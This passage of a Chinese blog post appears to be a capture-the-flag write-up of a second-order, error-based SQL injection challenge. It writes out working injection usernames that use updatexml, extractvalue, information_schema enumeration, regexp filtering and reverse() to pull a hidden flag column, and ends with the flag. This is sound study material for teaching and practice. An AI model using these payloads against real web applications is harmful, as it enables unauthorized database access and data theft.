+<p><img src="C:\Users\小杨\Desktop\3333.png"></p>
+<p>在这里插入图片描述<br>可以看到原语句中的username是双引号闭合的，所以单引号注册的账号是不起作用的.由此推断，我们注册admin”#因为闭合语句且将后面进行了注释，所以是可以sql语句会变为更改admin的语句。<br>由此，修改注册admin”#作为账户名登陆。成功登录，但是啥也没有（可以，埋伏一手）</p>
+<img src="C:\Users\小杨\Desktop\99.png" style="zoom: 67%;" />
+
+<p>可见这道题不是一道提权的问题，虽然登陆了admin用户但是并没有什么结果。然后我们将注意力放在那个修改密码报错的地方（有语法报错，考虑报错注入）， 设想可以注册一个用于报错的用户登陆，来修改密码的地方进行报错注入，然后显示出需要的内容。</p>
+<p>尝试：先注册页面fuzz一下：有过滤</p>
+<img src="C:\Users\小杨\Desktop\Q4444.png" style="zoom: 50%;" />
+
+<p>注册测试：</p>
+<p>用户名：x”||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#</p>
+<p>密码：xx   Email:xxx   进入尝试修改密码，爆出表名，思路正确</p>
+<p><img src="C:\Users\小杨\Desktop\ccc.png"></p>
+<p>继续尝试（多次尝试看到flag表中只有假flag，真flag在user表中）</p>
+<p>username=x”||(updatexml(1,concat(0x7e,(select(group_concat(0x3a,column_name,0x3a))from(information_schema.columns)where(table_name=’users’))),1))#</p>
+<p><img src="C:\Users\小杨\Desktop\7777.png"></p>
+<p>可以看到有表real_flag_1s_her,但是根据我的sql语句中的~~~~标记后半部分缺失，可以直到爆出的表名不完整</p>
+<p>username=x”||(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=’users’)&amp;&amp;(column_name)regexp(‘^r’))))#</p>
+<p>使用sql正则匹配，只列出real_flag_1s_her这一行     <del>real_flag_1s_her</del>（regexp(‘^r’)<code>是MySql的正则，</code>^r<code>匹配开头是r的字段，也就是</code>column_name=real_flag_1s_her）</p>
+<p>​      继续爆值 </p>
+<p>username=x”||(updatexml(1,concat(0x7e,(select(group_concat(0x7e,real_flag_1s_here,0x7e))from(users))),1))#   </p>
+<p> （出现了杂乱数据干扰，继续用正则匹配）      </p>
+<p><img src="C:\Users\小杨\Desktop\lllllllll.png"></p>
+<p>正则匹配：</p>
+<p>username=x”||(updatexml(1,concat(0x7e,(select(group_concat(0x7e,real_flag_1s_here,0x7e))from(users)where(real_flag_1s_here)regexp(‘^f’))),1))#</p>
+<p><img src="C:\Users\小杨\Desktop\yyy.png"></p>
+<p>有长度限制，right，left又被ban了，完了？</p>
+<p>nonono!!!  我们还有reverse()函数可以把flag逆序输出出来，就可以看到后续部分</p>
+<p>username=x”||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(‘^f’)))),1))#</p>
+<p><img src="C:\Users\小杨\Desktop\dddddd.png"></p>
+<p>写个脚本逆序一下，和之前的flag拼接，即得flag</p>
+<p><img src="C:\Users\小杨\Desktop\aaaa11.png"></p>
+<p>flag:    flag{46887670-f4ad-4ff1-8a35-cba5d464c190}</p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">uf9n1x-海屿</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/02/26/sql注入/">http://example.com/2022/02/26/sql注入/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com">uf9n1x's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2022/02/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><i class="fa fa-chevron-left">  </i><span>文件上传</span></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://cdnjson.com/images/2023/04/15/1.webp#https://s1.ax1x.com/2023/04/14/p9Sd0ns.png)"><div class="layout" id="footer"><div class="copyright">&copy;2023 By uf9n1x-海屿</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script src="/js/search/local-search.js"></script><script id="ribbon" src="/js/third-party/canvas-ribbon.js" size="150" alpha="0.6" zIndex="-1" data-click="false"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
